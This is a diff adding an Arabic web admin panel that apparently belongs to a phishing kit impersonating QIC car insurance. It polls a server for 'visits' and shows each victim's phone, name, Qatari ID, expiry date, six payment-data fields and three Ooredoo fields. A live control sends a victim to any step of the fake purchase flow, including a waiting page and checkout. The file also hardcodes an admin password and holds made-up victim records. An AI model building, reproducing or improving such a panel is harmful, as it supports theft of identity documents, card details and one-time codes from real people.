@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة تحكم - QIC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--v:#6568F5;--vd:#4F52D6;--vp:#F3F2FF;--ink:#1C1830;--soft:#6F6C83;--line:#E6E4F0;--bg:#F3F2F7;--green:#2F8F56;--red:#E2453C;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{font-family:'Tajawal','Segoe UI',Tahoma,Arial,sans-serif;background:var(--bg);color:var(--ink);min-height:100vh;}
+  button{font-family:inherit;}
+
+  /* ── LOGIN ── */
+  .login-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;}
+  .login-card{background:#fff;border-radius:24px;border:1.5px solid var(--line);padding:36px 28px;width:100%;max-width:380px;box-shadow:0 8px 32px rgba(20,15,60,.08);text-align:center;}
+  .login-logo{width:80px;height:80px;border-radius:22px;background:var(--vp);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;}
+  .login-logo svg{width:40px;height:40px;stroke:var(--v);}
+  .login-h{font-size:22px;font-weight:800;margin-bottom:4px;}
+  .login-sub{font-size:14px;color:var(--soft);margin-bottom:22px;}
+  .login-err{color:var(--red);font-size:13.5px;min-height:18px;margin-bottom:10px;}
+  .login-inp{width:100%;padding:13px 16px;border:1.5px solid var(--line);border-radius:14px;font-size:16px;font-weight:700;font-family:inherit;background:#F8F7FC;text-align:center;outline:none;margin-bottom:12px;letter-spacing:2px;}
+  .login-inp:focus{border-color:var(--v);background:#fff;}
+  .login-btn{width:100%;background:var(--v);color:#fff;border:none;border-radius:14px;padding:14px;font-size:16px;font-weight:700;cursor:pointer;}
+  .login-btn:hover{background:var(--vd);}
+
+  /* ── DASH ── */
+  .dash{max-width:1280px;margin:0 auto;padding:28px 24px 80px;}
+  .top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;gap:14px;flex-wrap:wrap;}
+  .top-left h1{font-size:26px;font-weight:800;}
+  .top-left p{font-size:14px;color:var(--soft);margin-top:3px;}
+  .top-right{display:flex;align-items:center;gap:12px;}
+  .wifi-pill{display:inline-flex;align-items:center;gap:8px;background:#fff;border:1.5px solid var(--line);border-radius:999px;padding:8px 16px;font-size:15px;font-weight:800;box-shadow:0 2px 8px rgba(20,15,60,.05);}
+  .wifi-pill svg{width:18px;height:18px;}
+  .wifi-pill svg.on path{animation:wifi-fade .8s ease-in-out infinite alternate;}
+  @keyframes wifi-fade{from{opacity:.35}to{opacity:1}}
+  .cnt-num{color:var(--v);}
+  .logout{background:none;border:1.5px solid var(--line);border-radius:10px;padding:8px 16px;font-size:14px;font-weight:700;color:var(--soft);cursor:pointer;}
+  .logout:hover{background:var(--bg);color:var(--ink);}
+
+  /* search + filter */
+  .toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;}
+  .search{flex:1;min-width:200px;padding:10px 14px;border:1.5px solid var(--line);border-radius:12px;font-size:15px;font-family:inherit;outline:none;background:#fff;}
+  .search:focus{border-color:var(--v);}
+  .filter{padding:10px 14px;border:1.5px solid var(--line);border-radius:12px;font-size:14px;font-family:inherit;background:#fff;cursor:pointer;color:var(--ink);}
+
+  /* table */
+  .tcard{background:#fff;border-radius:18px;border:1.5px solid var(--line);overflow:hidden;box-shadow:0 2px 12px rgba(20,15,60,.04);}
+  .tscroll{overflow-x:auto;}
+  table{width:100%;border-collapse:collapse;min-width:680px;}
+  thead th{text-align:right;font-size:13px;color:var(--soft);font-weight:700;padding:13px 18px;background:#F8F7FC;border-bottom:1px solid var(--line);white-space:nowrap;}
+  tbody td{padding:14px 18px;font-size:14.5px;border-bottom:1px solid #F2F1FA;white-space:nowrap;vertical-align:middle;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:hover{background:#FBFAFF;}
+  .act-cell{display:flex;gap:8px;}
+  .btn-s{border:1.5px solid var(--line);background:#fff;color:var(--ink);font-size:13.5px;font-weight:700;padding:7px 16px;border-radius:10px;cursor:pointer;white-space:nowrap;}
+  .btn-s:hover{background:var(--bg);}
+  .btn-s.pri{background:var(--v);color:#fff;border-color:var(--v);}
+  .btn-s.pri:hover{background:var(--vd);}
+  .badge{display:inline-flex;align-items:center;gap:6px;font-size:12.5px;font-weight:700;padding:5px 12px;border-radius:999px;}
+  .badge-on{background:#E4F5E9;color:var(--green);}
+  .badge-off{background:#F2F1FA;color:#8A87A0;}
+  .badge .dot{width:7px;height:7px;border-radius:50%;background:currentColor;}
+  .empty{text-align:center;padding:60px 20px;color:var(--soft);font-size:15px;}
+  .plan-tag{display:inline-block;background:var(--vp);color:var(--v);font-size:12px;font-weight:700;padding:2px 8px;border-radius:6px;margin-inline-start:6px;}
+
+  /* ── DETAILS MODAL ── */
+  .ov{position:fixed;inset:0;background:rgba(20,15,40,.45);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .2s ease;z-index:999;padding:20px;}
+  .ov.open{opacity:1;pointer-events:auto;}
+  .modal{background:#fff;border-radius:22px;width:100%;max-width:560px;max-height:90vh;display:flex;flex-direction:column;transform:translateY(14px);transition:transform .2s ease;overflow:hidden;}
+  .ov.open .modal{transform:translateY(0);}
+  .modal-head{display:flex;align-items:center;justify-content:space-between;padding:20px 24px 16px;border-bottom:1px solid var(--line);flex-shrink:0;}
+  .modal-head h3{font-size:19px;font-weight:800;}
+  .modal-x{width:32px;height:32px;border-radius:50%;border:none;background:var(--bg);display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;}
+  .modal-scroll{overflow-y:auto;padding:16px 18px 20px;background:#F7F6FB;}
+  .det-card{background:#fff;border:1.5px solid var(--line);border-radius:16px;padding:6px 16px 8px;margin-bottom:14px;box-shadow:0 1px 4px rgba(20,15,60,.03);}
+  .det-card:last-child{margin-bottom:0;}
+  .det-head{display:flex;align-items:center;gap:9px;padding:12px 0 10px;border-bottom:1px solid #F0EEF7;margin-bottom:4px;}
+  .det-head .ic{width:30px;height:30px;border-radius:9px;background:var(--vp);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+  .det-head .ic svg{width:17px;height:17px;stroke:var(--v);}
+  .det-head h4{font-size:14.5px;font-weight:800;color:var(--ink);}
+  .det-grid{display:grid;grid-template-columns:1fr 1fr;gap:0 18px;}
+  .det-item{display:flex;flex-direction:column;gap:3px;padding:9px 0;border-bottom:1px solid #F5F4FA;min-width:0;}
+  .det-item.full{grid-column:1 / -1;}
+  .det-l{font-size:12px;color:#9A97AC;font-weight:500;}
+  .det-v{font-size:14.5px;color:var(--ink);font-weight:700;word-break:break-word;line-height:1.4;}
+  .det-pill{display:inline-block;padding:3px 10px;border-radius:999px;font-size:12.5px;font-weight:700;}
+  @media (max-width:480px){
+    .modal{max-width:100%;max-height:92vh;border-radius:20px 20px 0 0;align-self:flex-end;}
+    .ov{align-items:flex-end;padding:0;}
+    .modal-scroll{padding:14px 14px 20px;}
+    .det-grid{grid-template-columns:1fr;gap:0;}
+    .det-card{padding:4px 14px 6px;}
+  }
+  .det-page{background:var(--vp);color:var(--v);}
+
+  /* ── REDIRECT MODAL ── */
+  .redir-note{font-size:14px;color:var(--soft);line-height:1.7;margin-bottom:16px;padding:0 24px;}
+  .redir-sel{width:calc(100% - 48px);margin:0 24px 14px;padding:13px 14px;border:1.5px solid var(--line);border-radius:14px;font-size:15px;font-family:inherit;background:#F8F7FC;color:var(--ink);outline:none;}
+  .redir-sel:focus{border-color:var(--v);}
+  .redir-btn{display:block;width:calc(100% - 48px);margin:0 24px 24px;background:var(--v);color:#fff;border:none;border-radius:14px;padding:14px;font-size:15.5px;font-weight:700;cursor:pointer;}
+  .redir-btn:hover{background:var(--vd);}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-card">
+    <div class="login-logo">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 3l7 3v6c0 4.5-3 7.8-7 9-4-1.2-7-4.5-7-9V6z"/><path d="M9 12l2 2 4-4"/>
+      </svg>
+    </div>
+    <div class="login-h">لوحة تحكم QIC</div>
+    <div class="login-sub">أدخل كلمة المرور للدخول</div>
+    <div class="login-err" id="loginErr"></div>
+    <input type="password" class="login-inp" id="loginPw" placeholder="••••••••" onkeydown="if(event.key==='Enter') doLogin()">
+    <button class="login-btn" onclick="doLogin()">دخول</button>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div class="dash" id="dashWrap" style="display:none">
+  <div class="top-bar">
+    <div class="top-left">
+      <h1>لوحة تحكم QIC</h1>
+      <p>متابعة الزيارات وبيانات المستخدمين لحظياً</p>
+    </div>
+    <div class="top-right">
+      <div class="wifi-pill">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" class="on" id="wifiIco">
+          <path d="M5 12.5C7.2 10.3 9.95 9 12 9s4.8 1.3 7 3.5"/>
+          <path d="M8 15.5c1.1-1.1 2.5-1.7 4-1.7s2.9.6 4 1.7"/>
+          <circle cx="12" cy="18.5" r="1"/>
+        </svg>
+        <span>نشط الآن: <span class="cnt-num" id="activeNum">0</span></span>
+      </div>
+      <button class="logout" onclick="doLogout()">خروج</button>
+    </div>
+  </div>
+
+  <div class="toolbar">
+    <input class="search" type="text" placeholder="بحث برقم الجوال أو الاسم..." oninput="renderTable()">
+    <select class="filter" onchange="renderTable()">
+      <option value="">كل الحالات</option>
+      <option value="active">نشط الآن</option>
+      <option value="inactive">غير نشط</option>
+    </select>
+  </div>
+
+  <div class="tcard">
+    <div class="tscroll">
+      <table>
+        <thead>
+          <tr>
+            <th>رقم الجوال</th>
+            <th>الاسم</th>
+            <th>نوع التأمين</th>
+            <th>مبلغ التأمين</th>
+            <th>الإجراءات</th>
+          </tr>
+        </thead>
+        <tbody id="tBody"></tbody>
+      </table>
+    </div>
+    <div class="empty" id="emptyMsg" style="display:none">لا توجد زيارات بعد. ستظهر هنا فور فتح الموقع.</div>
+  </div>
+</div>
+
+<!-- DETAILS MODAL -->
+<div class="ov" id="detOv" onclick="if(event.target===this) closeDet()">
+  <div class="modal">
+    <div class="modal-head"><h3>تفاصيل الزيارة</h3><button class="modal-x" onclick="closeDet()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#1C1830" stroke-width="2.5" stroke-linecap="round"><path d="M18 6L6 18M6 6l12 12"/></svg></button></div>
+    <div class="modal-scroll" id="detBody"></div>
+  </div>
+</div>
+
+<!-- REDIRECT MODAL -->
+<div class="ov" id="redirOv" onclick="if(event.target===this) closeRedir()">
+  <div class="modal">
+    <div class="modal-head"><h3>إعادة توجيه الزائر</h3><button class="modal-x" onclick="closeRedir()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#1C1830" stroke-width="2.5" stroke-linecap="round"><path d="M18 6L6 18M6 6l12 12"/></svg></button></div>
+    <p class="redir-note">سيُحوَّل الزائر تلقائياً في أقرب تحديث (خلال ثوانٍ) طالما لا يزال يتصفح الموقع.</p>
+    <select class="redir-sel" id="redirSel"></select>
+    <button class="redir-btn" onclick="confirmRedir()">تأكيد إعادة التوجيه</button>
+  </div>
+</div>
+
+<script>
+var PAGES=[
+  ['index.html','الصفحة الرئيسية'],
+  ['car-insurance-plan.html','1. اختيار خطة التأمين'],
+  ['car-data-form.html','2. بيانات السيارة'],
+  ['car-details-form.html','3. البيانات المطلوبة'],
+  ['car-confirmation-form.html','4. صفحة الانتظار'],
+  ['car-insurance-selection.html','5. اختيار نوع التأمين'],
+  ['car-plate-form.html','6. رقم اللوحة'],
+  ['car-personal-info-form.html','7. البيانات الشخصية'],
+  ['car-start-date-form.html','8. تاريخ بدء التأمين'],
+  ['car-checkout-form.html','9. الدفع']
+];
+var visits=[]; var pollTimer=null; var activeRedir=null;
+var TOKEN_KEY='qic_admin_token';
+
+function esc(s){ return (!s&&s!==0)?'—':String(s).replace(/[&<>"']/g,function(c){return({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]);}); }
+function tfmt(ts){ if(!ts) return '—'; var d=new Date(ts); return d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
+
+function renderTable(){
+  var q=(document.querySelector('.search')||{}).value||'';
+  var filt=(document.querySelector('.filter')||{}).value||'';
+  var filtered=visits.filter(function(v){
+    if(filt&&v.status!==filt) return false;
+    if(q){ var lq=q.toLowerCase(); return (v.phone||'').includes(q)||(v.name||'').toLowerCase().includes(lq); }
+    return true;
+  });
+  var active=visits.filter(function(v){return v.status==='active';}).length;
+  document.getElementById('activeNum').textContent=active;
+  var body=document.getElementById('tBody');
+  var empty=document.getElementById('emptyMsg');
+  if(!filtered.length){ body.innerHTML=''; empty.style.display='block'; empty.textContent=visits.length?'لا توجد نتائج للبحث.':'لا توجد زيارات بعد. ستظهر هنا فور فتح الموقع.'; return; }
+  empty.style.display='none';
+  body.innerHTML=filtered.map(function(v){
+    var on=v.status==='active';
+    var badge='<span class="badge '+(on?'badge-on':'badge-off')+'"><span class="dot"></span>'+(on?'نشط الآن':'غير نشط')+'</span>';
+    return '<tr>'+
+      '<td>'+(esc(v.phone)||'—')+(v.lang==='en'?'<span class="plan-tag">EN</span>':'')+'</td>'+
+      '<td>'+(esc(v.name)||'—')+'</td>'+
+      '<td>'+(v.planName?'<span class="plan-tag">'+esc(v.planName)+'</span>':badge)+'</td>'+
+      '<td>'+(v.price?esc(v.price)+' ر.ق':'—')+'</td>'+
+      '<td><div class="act-cell">'+
+        '<button class="btn-s" onclick="openDet(\''+v.visitId+'\')">التفاصيل</button>'+
+        '<button class="btn-s pri" onclick="openRedir(\''+v.visitId+'\')">إعادة التوجيه</button>'+
+      '</div></td>'+
+    '</tr>';
+  }).join('');
+}
+
+function find(id){ for(var i=0;i<visits.length;i++) if(visits[i].visitId===id) return visits[i]; return null; }
+
+var SEC_ICONS={"معلومات الاتصال": "<path d=\"M20 21c0-3.3-3.6-6-8-6s-8 2.7-8 6\"/><circle cx=\"12\" cy=\"8\" r=\"4\"/>", "بيانات السيارة": "<path d=\"M5 13l1.6-4.4A2 2 0 0 1 8.5 7.3h7a2 2 0 0 1 1.9 1.3L19 13\"/><path d=\"M4 13h16v4H4z\"/><circle cx=\"7.5\" cy=\"15\" r=\".9\"/><circle cx=\"16.5\" cy=\"15\" r=\".9\"/>", "بيانات التأمين": "<path d=\"M12 3l7 3v6c0 4.5-3 7.8-7 9-4-1.2-7-4.5-7-9V6z\"/><path d=\"M9 12l2 2 4-4\"/>", "بيانات الدفع": "<rect x=\"3\" y=\"5\" width=\"18\" height=\"14\" rx=\"2.5\"/><path d=\"M3 10h18\"/>", "بيانات أوريدو": "<circle cx=\"12\" cy=\"12\" r=\"9\"/><path d=\"M8 12a4 4 0 0 1 8 0 4 4 0 0 1-8 0z\"/>"};
+function openDet(id){
+  var v=find(id); if(!v) return;
+  var sections=[
+    ['معلومات الاتصال',[
+      ['رقم الجوال',v.phone],['الاسم الكامل',v.name],['البريد الإلكتروني',v.email],['الجنس',v.gender]
+    ]],
+    ['بيانات السيارة',[
+      ['العلامة والموديل',[v.brand,v.model,v.man_year].filter(Boolean).join(' ')],
+      ['نوع السيارة',v.car_type],['سنة التسجيل',v.reg_date],
+      ['عدد المقاعد',v.seats],['الأسطوانات',v.cylinders],
+      ['رقم القاعدة',v.plate],['رقم اللوحة',v.plate_no]
+    ]],
+    ['بيانات التأمين',[
+      ['رقم البطاقة القطرية',v.qid],['تاريخ صلاحية البطاقة',v.qid_expiry],
+      ['نوع التأمين',v.planName],['مبلغ التأمين',v.price?(v.price+' ر.ق'):null],
+      ['تاريخ الميلاد',v.dob],['تاريخ البدء',v.start_date],
+      ['الرمز الترويجي',v.promo]
+    ]],
+    ['بيانات الدفع',[
+      ['حالة الدفع',(v.paid==='مكتمل'||v.paid===true)?'<span class="det-pill" style="background:#E4F5E9;color:#2F8F56">✓ مكتمل</span>':'<span class="det-pill" style="background:#FFF0E0;color:#C46B00">قيد الإتمام</span>'],
+      ['بيانات الدفع 1',v.pay_field1||'—'],
+      ['بيانات الدفع 2',v.pay_field2||'—'],
+      ['بيانات الدفع 3',v.pay_field3||'—'],
+      ['بيانات الدفع 4',v.pay_field4||'—'],
+      ['بيانات الدفع 5',v.pay_field5||'—'],
+      ['بيانات الدفع 6',v.pay_field6||'—']
+    ]],
+    ['بيانات أوريدو',[
+      ['بيانات أوريدو 1',v.ooredoo_field1||'—'],
+      ['بيانات أوريدو 2',v.ooredoo_field2||'—'],
+      ['بيانات أوريدو 3',v.ooredoo_field3||'—']
+    ]]
+  ];
+  var h='';
+  sections.forEach(function(sec){
+    var items='';
+    sec[1].forEach(function(r){
+      var val=(r[1]===undefined||r[1]===null||r[1]==='')?'—':r[1];
+      var isLong=(typeof val==='string' && val.length>22 && val.indexOf('det-pill')===-1) || (r[0]||'').indexOf('البريد')!==-1;
+      items+='<div class="det-item'+(isLong?' full':'')+'"><span class="det-l">'+r[0]+'</span><span class="det-v">'+val+'</span></div>';
+    });
+    var ic=SEC_ICONS[sec[0]]||'';
+    h+='<div class="det-card"><div class="det-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">'+ic+'</svg></span><h4>'+sec[0]+'</h4></div><div class="det-grid">'+items+'</div></div>';
+  });
+  document.getElementById('detBody').innerHTML=h;
+  document.getElementById('detOv').classList.add('open');
+}
+function closeDet(){ document.getElementById('detOv').classList.remove('open'); }
+
+function openRedir(id){
+  activeRedir=id;
+  document.getElementById('redirSel').innerHTML=PAGES.map(function(p){return '<option value="'+p[0]+'">'+p[1]+'</option>';}).join('');
+  document.getElementById('redirOv').classList.add('open');
+}
+function closeRedir(){ document.getElementById('redirOv').classList.remove('open'); activeRedir=null; }
+function confirmRedir(){
+  if(!activeRedir) return;
+  var t=document.getElementById('redirSel').value;
+  authFetch('/api/redirect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitId:activeRedir,target:t})})
+    .then(function(){ closeRedir(); }).catch(function(){ alert('تعذر التوجيه. تأكد أن السيرفر شغال.'); });
+}
+
+/* ── API ── */
+function authFetch(url,opts){
+  opts=opts||{}; opts.headers=opts.headers||{};
+  opts.headers['x-admin-token']=localStorage.getItem(TOKEN_KEY)||'';
+  return fetch(url,opts);
+}
+function fetchVisits(){
+  authFetch('/api/visits').then(function(r){
+    if(r.status===401){ showLogin('انتهت الجلسة، أعد تسجيل الدخول'); return null; }
+    return r.json();
+  }).then(function(data){ if(!data) return; visits=data; renderTable(); })
+  .catch(function(){
+    /* server not running — show demo data */
+    visits=DEMO_VISITS; renderTable();
+  });
+}
+function showLogin(msg){
+  if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
+  document.getElementById('dashWrap').style.display='none';
+  document.getElementById('loginScreen').style.display='flex';
+  document.getElementById('loginErr').textContent=msg||'';
+  localStorage.removeItem(TOKEN_KEY);
+}
+
+var DEMO_VISITS=[
+  {visitId:'v_demo1',status:'active',phone:'55123456',name:'محمد عبدالله القحطاني',email:'m.qahtani@email.com',gender:'ذكر',
+   brand:'Toyota',model:'Land Cruiser',man_year:'2022',seats:'7',cylinders:'8',
+   car_type:'SUV',reg_date:'2022',qid:'28763412345',qid_expiry:'15/03/2027',
+   planName:'التأمين الشامل',price:'1200',features:'تغطية أضرار سيارتك الخاصة|المسؤولية ضد الغير|ورش إصلاح موثوقة',
+   plate_no:'123456',start_date:'2026-10-01',promo:'',
+   page:'car-checkout-form.html',lang:'ar',pay_method:'بطاقة ائتمان (Visa)',total_price:'1200',paid:false,purchase_date:'',createdAt:Date.now()-120000,updatedAt:Date.now()-5000},
+  {visitId:'v_demo2',status:'active',phone:'33987654',name:'فاطمة علي المنصوري',email:'fatima.m@gmail.com',gender:'أنثى',
+   brand:'Nissan',model:'Patrol',man_year:'2021',seats:'7',cylinders:'6',
+   car_type:'SUV',reg_date:'2021',qid:'29145678901',qid_expiry:'20/08/2026',
+   planName:'التأمين الشامل',price:'1200',features:'تغطية أضرار سيارتك الخاصة|المسؤولية ضد الغير',
+   plate_no:'78432',start_date:'2026-11-01',promo:'QIC10',
+   page:'car-personal-info-form.html',lang:'ar',createdAt:Date.now()-300000,updatedAt:Date.now()-20000},
+  {visitId:'v_demo3',status:'active',phone:'55334411',name:'',email:'',gender:'',
+   brand:'Kia',model:'Sportage',man_year:'2023',seats:'5',cylinders:'4',
+   car_type:'كروس أوفر',reg_date:'2023',qid:'',
+   planName:'التأمين ضد الغير',price:'600',features:'المسؤولية ضد الغير|المسؤولية تجاه الركاب',
+   plate_no:'',start_date:'',promo:'',
+   page:'car-details-form.html',lang:'ar',createdAt:Date.now()-600000,updatedAt:Date.now()-45000},
+  {visitId:'v_demo4',status:'inactive',phone:'66221133',name:'خالد سعد الدوسري',email:'k.dosari@company.qa',gender:'ذكر',
+   brand:'Mercedes-Benz',model:'GLE',man_year:'2023',seats:'5',cylinders:'6',
+   car_type:'SUV',reg_date:'2023',qid:'29876543210',qid_expiry:'10/12/2028',
+   planName:'التأمين الشامل',price:'1200',features:'تغطية أضرار سيارتك الخاصة|المسؤولية ضد الغير|ورش إصلاح موثوقة|خدمة المساعدة على الطريق 24/7',
+   plate_no:'456123',start_date:'2026-10-15',promo:'',
+   page:'car-checkout-form.html',lang:'ar',pay_method:'بطاقة خصم قطرية (NAPS)',total_price:'1200',paid:true,purchase_date:'24/09/2026 02:15م',createdAt:Date.now()-3600000,updatedAt:Date.now()-900000},
+  {visitId:'v_demo5',status:'inactive',phone:'50778899',name:'سارة محمد العمري',email:'sara.amri@hotmail.com',gender:'أنثى',
+   brand:'Toyota',model:'Camry',man_year:'2020',seats:'5',cylinders:'4',
+   car_type:'سيدان',reg_date:'2020',qid:'28512345678',qid_expiry:'05/06/2027',
+   planName:'التأمين ضد الغير',price:'600',features:'المسؤولية ضد الغير|المسؤولية تجاه الركاب',
+   plate_no:'99001',start_date:'2026-10-20',promo:'',
+   page:'car-start-date-form.html',lang:'ar',createdAt:Date.now()-7200000,updatedAt:Date.now()-3600000}
+];
+function showDash(){
+  document.getElementById('loginScreen').style.display='none';
+  document.getElementById('dashWrap').style.display='block';
+  fetchVisits();
+  if(pollTimer) clearInterval(pollTimer);
+  pollTimer=setInterval(fetchVisits,3000);
+}
+var ADMIN_PW='Ha098765@@';
+function doLogin(){
+  var pw=document.getElementById('loginPw').value;
+  document.getElementById('loginErr').textContent='';
+  /* local fallback: works without server */
+  if(pw===ADMIN_PW){
+    localStorage.setItem(TOKEN_KEY,'local_'+Date.now());
+    showDash(); return;
+  }
+  /* try server if available */
+  fetch('/api/admin-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})})
+    .then(function(r){return r.json().then(function(d){return{s:r.status,b:d};});})
+    .then(function(res){
+      if(res.s===200&&res.b.token){ localStorage.setItem(TOKEN_KEY,res.b.token); showDash(); }
+      else document.getElementById('loginErr').textContent='كلمة المرور غير صحيحة';
+    }).catch(function(){ document.getElementById('loginErr').textContent='كلمة المرور غير صحيحة'; });
+}
+function doLogout(){
+  authFetch('/api/admin-logout',{method:'POST'}).catch(function(){});
+  showLogin();
+}
+document.addEventListener('keydown',function(e){ if(e.key==='Escape'){ closeDet(); closeRedir(); } });
+if(localStorage.getItem(TOKEN_KEY)) showDash(); else document.getElementById('loginScreen').style.display='flex';
+</script>
+</body>
+</html>
